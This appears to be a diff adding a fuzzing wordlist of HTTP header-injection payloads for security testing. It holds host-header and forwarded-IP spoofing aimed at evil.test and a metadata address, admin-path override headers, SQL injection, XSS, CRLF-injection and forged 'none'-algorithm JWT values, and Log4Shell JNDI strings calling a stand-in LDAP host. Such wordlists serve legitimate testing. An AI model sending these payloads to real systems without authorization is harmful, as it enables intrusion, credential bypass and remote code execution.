@@ -1,0 +1,136 @@
+# category: headers
+# description: Header-injection payloads and interesting header names/values for fuzzing.
+# references: OWASP Header Injection, PortSwigger Host-Header Attacks.
+# notes: Each line is "Name: Value" or "Name:" for a header-name probe.
+
+Host: evil.test
+Host: evil.test:80
+Host: evil.test:443
+Host: example.com:80@evil.test
+Host: evil.test, example.com
+Host: localhost
+Host: 127.0.0.1
+Host: 0.0.0.0
+X-Forwarded-Host: evil.test
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.0.0.1, 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 169.254.169.254
+X-Forwarded-Proto: http
+X-Forwarded-Proto: https
+X-Forwarded-Proto: ws
+X-Forwarded-Proto: file
+X-Forwarded-Scheme: http
+X-Host: evil.test
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Override-URL: /admin
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: PATCH
+X-HTTP-Method: PUT
+X-Method-Override: DELETE
+X-Forwarded-Method: PUT
+Content-Type: application/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: text/xml
+Content-Type: multipart/form-data; boundary=----A
+Content-Type: application/json; charset=utf-7
+Accept: */*
+Accept: application/vnd.api+v2+json
+Accept-Language: ar-SA
+Accept-Encoding: identity
+Accept-Encoding: gzip, deflate, br
+Cache-Control: no-cache
+Pragma: no-cache
+Origin: null
+Origin: https://evil.test
+Origin: file://
+Referer: https://evil.test
+Referer: javascript:alert(1)
+Cookie: session=../../../
+Cookie: session=' OR '1'='1
+If-Match: *
+If-None-Match: *
+Range: bytes=0-18446744073709551615
+Range: bytes=0-,0-0
+Via: 1.1 evil.test
+Max-Forwards: 0
+Max-Forwards: 100
+Expect: 100-continue
+Upgrade: websocket
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+Content-Length: 0
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+X-Api-Key: 00000000-0000-0000-0000-000000000000
+Content-Type: application/json\r\nX-Injected: camio
+User-Agent: ' OR '1'='1
+User-Agent: ${jndi:ldap://x.test/a}
+User-Agent: <script>alert(1)</script>
+X-Injected: camio\r\nX-Second: injected
+
+# ── Cache-poisoning candidates ───────────────────────────────────────────
+X-Cache-Key: /x
+X-Cache-Hash: deadbeef
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-HTTP-DestinationURL: /admin
+X-Forwarded-Server: evil.test
+X-Server: evil.test
+X-Backend-URL: http://evil.test/
+X-Forwarded-Path: /../admin
+X-URI: /admin
+X-URL: /admin
+X-Real-URL: /admin
+X-Forwarded-Prefix: /admin
+X-Proxy-URL: http://x.test/
+X-Forwarded-URI: /admin
+
+# ── Content-Security-Policy variants (that break framing) ───────────────
+Content-Security-Policy: default-src 'self'
+Content-Security-Policy: default-src *
+Content-Security-Policy: default-src 'unsafe-inline'
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: sandbox
+
+# ── HTTP smuggling helpers ──────────────────────────────────────────────
+Expect: 100-continue
+Expect:
+TE: trailers
+TE: gzip
+TE: identity
+Connection: TE
+Connection: Upgrade
+Upgrade: websocket
+Upgrade: h2c
+Upgrade: HTTP/2.0
+
+# ── Cookie variants ──────────────────────────────────────────────────────
+Cookie: __Host-sess=1
+Cookie: __Secure-sess=1
+Cookie: sess=../../../
+Cookie: sess=${jndi:ldap://x.test/a}
+Cookie: csrf=<script>alert(1)</script>
+Cookie: id=1' OR '1'='1
+Cookie: path=../admin
+
+# ── API-gateway / service-mesh ───────────────────────────────────────────
+X-Envoy-Original-Path: /admin
+X-Envoy-External-Address: 127.0.0.1
+X-Envoy-Peer-Metadata: xxx
+X-Envoy-Peer-Metadata-Id: xxx
+X-B3-TraceId: 1
+X-B3-SpanId: 1
+X-Datadog-Trace-Id: 1
+Traceparent: 00-aa-bb-01
